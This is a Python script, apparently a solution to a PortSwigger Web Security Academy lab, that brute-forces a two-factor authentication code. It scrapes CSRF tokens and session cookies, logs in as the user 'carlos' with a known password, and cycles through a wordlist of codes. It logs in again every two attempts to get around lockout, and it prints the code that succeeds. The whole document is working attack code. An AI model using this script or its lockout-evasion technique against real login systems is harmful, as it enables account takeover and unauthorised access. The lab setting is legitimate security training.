
import requests
from bs4 import BeautifulSoup


url = "https://acc01f951e22c125c077d537009a0011.web-security-academy.net/login2"

login_url ="https://acc01f951e22c125c077d537009a0011.web-security-academy.net/login"



fd = open('9k.txt','r')
wordlist = fd.read()
fd.close()

otpcodes = list(wordlist.split('\n'))

r = requests.get(login_url)
#print(r.text)
soup = BeautifulSoup(r.text,"html.parser")
token = soup.find("input",{"name":"csrf"})
new_token = token['value']
#print(new_token)
cookies2 = r.cookies
#print(cookies2[0])

data = {
	"csrf":new_token,
	"username":"carlos",
	"password":"montoya"
}

cookies = {
	"session":r.cookies['session']
}
#print(cookies)

r = requests.post(login_url,data=data,cookies=cookies)

#fetching csrf token in response 
counter = 0

for i in otpcodes:
#logging in to get csrf token and cookies
	if counter == 2:
		r = requests.get(login_url)
		soup = BeautifulSoup(r.text,"html.parser")
		token = soup.find("input",{"name":"csrf"})
		new_token = token['value']
		#print(new_token)
		cookies2 = r.cookies

		data = {
			"csrf":new_token,
			"username":"carlos",
			"password":"montoya"
		}
		cookies = {
			"session":r.cookies['session']
		}

		r = requests.post(login_url,data=data,cookies=cookies)
		counter = 0

	soup = BeautifulSoup(r.text,"html.parser")
	token = soup.find("input",{"name":"csrf"})
	new_token = token['value']
	#print(new_token)
	#cookies2 = r.cookies

	#cookies = {
	#	"session":r.cookies['session']
	#}


	data = {
		"csrf":new_token,
		"mfa-code":i
	}

	r = requests.post(url,cookies=cookies,data=data)
	counter +=1
	if "Incorrect security code" not in r.text:
		print(i)
		break
	else:
		#print(r.text)
		soup = BeautifulSoup(r.text,"html.parser")
		token = soup.find("input",{"name":"csrf"})
		new_token = str(token['value'])
		print(new_token)



